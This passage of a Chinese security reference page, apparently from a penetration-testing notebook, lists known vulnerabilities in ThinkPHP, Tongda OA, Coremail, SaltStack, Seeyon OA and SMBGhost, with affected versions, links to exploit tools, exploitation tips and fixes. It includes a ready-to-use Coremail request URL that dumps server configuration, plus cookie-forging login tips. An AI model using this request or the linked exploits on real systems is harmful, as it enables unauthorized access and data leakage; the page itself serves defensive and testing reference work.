+   <a href="https://cloud.tencent.com/developer/news/305625">https://cloud.tencent.com/developer/news/305625</a>
+   ThinkPHP5_SQL注入漏洞&amp;&amp;敏感信息泄露</p>
+</li>
+<li>
+<p>影响版本
+   &lt; 5.0.9</p>
+</li>
+<li>
+<p>漏洞复现
+   <a href="https://xz.aliyun.com/t/125">https://xz.aliyun.com/t/125</a>&gt; 
+   &lt;<a href="https://www.leavesongs.com/PENETRATION/thinkphp5-in">https://www.leavesongs.com/PENETRATION/thinkphp5-in</a>￾sqlinjection.html
+   ThinkPHP5.0.10-
+   3.2.3_缓存函数设计缺陷可导致Getshell</p>
+</li>
+<li>
+<p>影响版本
+    &lt; 5.0.11</p>
+</li>
+<li>
+<p>漏洞复现
+    <a href="https://xz.aliyun.com/t/99">https://xz.aliyun.com/t/99</a>
+    ThinkPHP框架5.0.X_sql注入漏洞分析</p>
+</li>
+<li>
+<p>影响版本
+    &lt; 5.0.16</p>
+</li>
+<li>
+<p>漏洞复现
+    <a href="https://xz.aliyun.com/t/2257">https://xz.aliyun.com/t/2257</a>
+    ThinkPHP5.X_order_by注入漏洞</p>
+</li>
+<li>
+<p>影响版本
+    &lt;= 5.1.22</p>
+</li>
+<li>
+<p>漏洞复现
+    <a href="https://www.cnblogs.com/wangtanzhi/p/12741498.html">https://www.cnblogs.com/wangtanzhi/p/12741498.html</a>
+    ThinkPHP5.X_远程代码执行</p>
+</li>
+<li>
+<p>影响版本
+    5.0.5-5.0.22
+    5.1.0-5.1.30</p>
+</li>
+<li>
+<p>漏洞复现
+    <a href="https://xz.aliyun.com/t/3570https://paper.seebug.org/760https://pap">https://xz.aliyun.com/t/3570https://paper.seebug.org/760https://pap</a>
+    er.seebug.org/770</p>
+</li>
+</ol>
+<h2 id="oa_2">通达OA相关<a class="headerlink" href="#oa_2" title="Permanent link">&para;</a></h2>
+<h3 id="oa_3">通达OA任意用户登录漏洞<a class="headerlink" href="#oa_3" title="Permanent link">&para;</a></h3>
+<p>1.漏洞简介
+通达OA采用基于WEB的企业计算，主HTTP服务器采用了世界上最先进的
+Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可
+能。提供数据备份工具，保护系统数据安全。多级的权限控制，完善的密
+码验证与登录验证机制更加强了系统安全性。
+2.影响范围
+通达OA2017
+通达OA V11.x&lt;V11.5
+3.漏洞指纹
+/static/templates/2017_01/userName.png
+Office Anywhere 20xx版 网络智能办公系统
+/ispirit/interface/gateway.php
+4.漏洞利用工具
+<a href="https://github.com/NS-Sp4ce/TongDaOA-Fake-User">https://github.com/NS-Sp4ce/TongDaOA-Fake-User</a>
+<a href="https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_e">https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_e</a>
+xp.py
+5.详细文章
+<a href="https://www.cnblogs.com/lovequitepcs/p/12864203.html">https://www.cnblogs.com/lovequitepcs/p/12864203.html</a>
+6.利用技巧与坑点
+可以使用chrome的EditThisCookie插件修改cookie，修改cookies别忘记访
+问，否则无法登录成功
+/general/index.php?isIB=0&amp;modify_pwd=0
+7.防护方法
+升级通达oa到最新版本</p>
+<h3 id="oa_4">通达OA命令执行漏洞<a class="headerlink" href="#oa_4" title="Permanent link">&para;</a></h3>
+<p>1.漏洞简介
+通达OA采用基于WEB的企业计算，主HTTP服务器采用了世界上最先进的
+Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可
+能。提供数据备份工具，保护系统数据安全。多级的权限控制，完善的密
+码验证与登录验证机制更加强了系统安全性。
+2.影响范围
+通达OA V11版
+通达OA 2017版
+通达OA 2016版
+通达OA 2015版
+通达OA 2013增强版
+通达OA 2013版
+3.漏洞利用工具
+<a href="https://github.com/jas502n/OA-tongda-RCE">https://github.com/jas502n/OA-tongda-RCE</a>
+4.详细文章
+<a href="https://zhuanlan.zhihu.com/p/114264570">https://zhuanlan.zhihu.com/p/114264570</a>
+5.防护方法
+更新通达oa最新补丁
+安全更新地址:<a href="http://www.tongda2000.com/news/673.php">http://www.tongda2000.com/news/673.php</a></p>
+<h3 id="oa_5">通达OA扫码登录任意用户登录<a class="headerlink" href="#oa_5" title="Permanent link">&para;</a></h3>
+<p>1.漏洞简介
+通达OA采用基于WEB的企业计算，主HTTP服务器采用了世界上最先进的
+Apache服务器，性能稳定可靠。数据存取集中控制，避免了数据泄漏的可
+能。提供数据备份工具，保护系统数据安全。多级的权限控制，完善的密
+码验证与登录验证机制更加强了系统安全性。
+2.影响范围
+通达OA v2017、v11.x &lt; v11.5 支持扫码登录版本
+3.漏洞分析文章
+<a href="https://xz.aliyun.com/t/7704#toc-4">https://xz.aliyun.com/t/7704#toc-4</a></p>
+<h2 id="coremail">Coremail漏洞相关<a class="headerlink" href="#coremail" title="Permanent link">&para;</a></h2>
+<ol>
+<li>漏洞简介
+   Coremail邮件系统配置文件信息泄露漏洞</li>
+<li>Coremail产品诞生于1999年，经过二十多年发展，如今从亿万级别的
+   运营系统，到几万人的大型企业，都有了Coremail的客户。
+   截止2019年，Coremail邮件系统产品在国内已拥有10亿终端用户
+   ，是目前国内拥有邮箱使用用户最多的邮件系统。Coremail今天不但
+   为网易（126、163、yeah）、移动，联通等知名运营商提供电子邮件
+   整体技术解决方案及企业邮局运营服务，还为石油、钢铁、电力、政府
+   、金融、教育、尖端制造企业等用户提供邮件系统软件和反垃圾服务。</li>
+<li>利用方式
+   <a href="http://host/mailsms/s?func=ADMIN:appState&amp;dumpConfig=/">http://host/mailsms/s?func=ADMIN:appState&amp;dumpConfig=/</a>
+   浏览器请求访问，即可查看配置文件信息。</li>
+<li>修复方法
+   更新Coremail版本或联系厂家修复</li>
+</ol>
+<h2 id="saltstack">SaltStack漏洞相关<a class="headerlink" href="#saltstack" title="Permanent link">&para;</a></h2>
+<ol>
+<li>漏洞简介
+   SaltStack是基于Python开发的一套C/S架构配置管理工具，是一个服
+   务器基础架构集中化管理平台，具备配置管理、远程执行、监控等功能
+   。</li>
+<li>影响范围：
+   SaltStack &lt; 2019.2.4
+    SaltStack &lt; 3000.2</li>
+<li>漏洞利用工具
+   Saltstack远程命令执行漏洞EXP
+   <a href="https://github.com/Imanfeng/SaltStack-Exp.git">https://github.com/Imanfeng/SaltStack-Exp.git</a></li>
+<li>详细文章
+   <a href="https://www.cnblogs.com/Cl0wn/p/12918432.html">https://www.cnblogs.com/Cl0wn/p/12918432.html</a></li>
+<li>修复方法
+   更新版本
+   SaltStack = 2019.2.4
+   SaltStack = 3000.2
+   <a href="https://github.com/saltstack/salt/commit/a67d76b15615983d467ed8">https://github.com/saltstack/salt/commit/a67d76b15615983d467ed8</a>
+   1371b38b4a17e4f3b7
+   <a href="https://github.com/saltstack/salt/commit/d5801df94b05158dc8e48c">https://github.com/saltstack/salt/commit/d5801df94b05158dc8e48c</a>
+   5e6912b065044720f3</li>
+</ol>
+<h2 id="oa_6">致远OA漏洞相关<a class="headerlink" href="#oa_6" title="Permanent link">&para;</a></h2>
+<ol>
+<li>
+<p>漏洞简介
+   CNVD 《 关 于 致 远 OA￾A8系统存在远程命令执行漏洞的安全公告》：<a href="https://www.cnvd.org.c">https://www.cnvd.org.c</a>
+   n/webinfo/show/5095
+   该 系 统 的 漏 洞 点 在 于 致 远 OA￾A8系统的Servlet接口暴露，安全过滤处理措施不足，使得用户在无需
+   认证的情况下实现任意文件上传。
+   攻击者利用该漏洞，可在未授权的情况下，远程发送精心构造的网站后
+   门文件，从而获取目标服务器权限，在目标服务器上执行任意代码漏洞
+   。</p>
+</li>
+<li>
+<p>影响范围
+   致远OA A8-V5 V6.1 SP1
+   致远OA A8+协同管理软件 V7.0
+   致远OA A8+协同管理软件 V7.0 SP1
+   致远OA A8+协同管理软件 V7.0 SP2
+   致远OA A8+协同管理软件 V7.0 SP3
+   致远OA A8+协同管理软件 V7.1</p>
+</li>
+<li>
+<p>漏洞利用工具
+   <a href="https://github.com/timwhitez/seeyon-OA-A8-GetShell">https://github.com/timwhitez/seeyon-OA-A8-GetShell</a></p>
+</li>
+<li>
+<p>详细文章
+   <a href="https://www.jianshu.com/p/0955bdd7329c">https://www.jianshu.com/p/0955bdd7329c</a> 任意文件上传详情
+   <a href="https://www.cnblogs.com/AtesetEnginner/p/12106741.html">https://www.cnblogs.com/AtesetEnginner/p/12106741.html</a> </p>
+</li>
+</ol>
+<h2 id="_1">历史漏洞相关信息<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<h3 id="cve-2020-0796">CVE-2020-0796 永恒之黑漏洞相关<a class="headerlink" href="#cve-2020-0796" title="Permanent link">&para;</a></h3>
+<ol>
+<li>漏洞简介
+   微软SMBv3 Client/Server远程代码执行漏洞CVE-2020-0796</li>
+<li>
+<p>影响范围：
+   Windows 10 Version 1903 for 32-bit SystemsWindows 10 Version 
+   1903 for x64-based SystemsWindows 10 Version 1903 for ARM64-
+   based SystemsWindows Server, Version 1903 (Server Core 
+   installation)Windows 10 Version 1909 for 32-bit SystemsWindows 
+   10 Version 1909 for x64-based SystemsWindows 10 Version 1909 
+   for ARM64-based SystemsWindows Server, Version 1909 (Server 
+   Core installation)</p>
+</li>
+<li>
+<p>漏洞利用工具
+   <a href="https://github.com/chompie1337/SMBGhost_RCE_PoC">https://github.com/chompie1337/SMBGhost_RCE_PoC</a></p>
+</li>
+<li>
+<p>详细文章
+   <a href="https://www.cnblogs.com/Iamyoyodan/p/13081273.html">https://www.cnblogs.com/Iamyoyodan/p/13081273.html</a></p>
+</li>
+<li>
+<p>利用技巧与坑点
+   偶尔会蓝屏</p>
+</li>
+<li>防护方法
+   关闭高危端口139、445，更新系统安全补丁禁用SMBv3压缩命令:
+   Set-ItemProperty -Path 
+   "HKLM:\SYSTEM\CurrentControlSet\Services\LanmanServer\
+   Parameters" DisableCompression -Type DWORD -Value 1 -
+   Force</li>
+</ol>
+
+  <hr>
+<div class="md-source-file">
+  <small>
+    
+      最后更新:
+      <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-iso_datetime">2022-02-05 18:25:45</span>
+      
+    
+  </small>
+</div>
+
+              
+            </article>
+          </div>
+        </div>
+        
+          <a href="#" class="md-top md-icon" data-md-component="top" data-md-state="hidden">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"/></svg>
+            回到页面顶部
+          </a>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    <nav class="md-footer__inner md-grid" aria-label="页脚">
+      
+        
+        <a href="../%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="md-footer__link md-footer__link--prev" aria-label="上一页: 信息收集" rel="prev">
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+          </div>
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                上一页
+              </span>
+              信息收集
+            </div>
+          </div>
+        </a>
+      
+      
+        
+        <a href="../%E6%BA%AF%E6%BA%90%E5%88%86%E6%9E%90/" class="md-footer__link md-footer__link--next" aria-label="下一页: 溯源分析" rel="next">
+          <div class="md-footer__title">
+            <div class="md-ellipsis">
+              <span class="md-footer__direction">
+                下一页
+              </span>
+              溯源分析
+            </div>
+          </div>
+          <div class="md-footer__button md-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+          </div>
+        </a>
+      
+    </nav>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    keep learning ，stay foolish ，continue thinking
+  <!--   <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a> -->
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.tabs", "navigation.sections", "navigation.expand", "navigation.indexes", "navigation.top", "header.autohide"], "translations": {"clipboard.copy": "\u590d\u5236", "clipboard.copied": "\u5df2\u590d\u5236", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\uff0c\\u3002]+", "search.placeholder": "\u641c\u7d22", "search.result.placeholder": "\u952e\u5165\u4ee5\u5f00\u59cb\u641c\u7d22", "search.result.none": "\u6ca1\u6709\u627e\u5230\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.one": "\u627e\u5230 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.other": "# \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.one": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 1 \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.more.other": "\u5728\u8be5\u9875\u4e0a\u8fd8\u6709 # \u4e2a\u7b26\u5408\u6761\u4ef6\u7684\u7ed3\u679c", "search.result.term.missing": "\u7f3a\u5c11", "select.version.title": "\u9009\u62e9\u5f53\u524d\u7248\u672c"}, "search": "../../assets/javascripts/workers/search.22074ed6.min.js"}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.960e086b.min.js"></script>
+      
+        <script src="../../js/baidu-tongji.js"></script>
+      
+    
+  </body>
+</html>
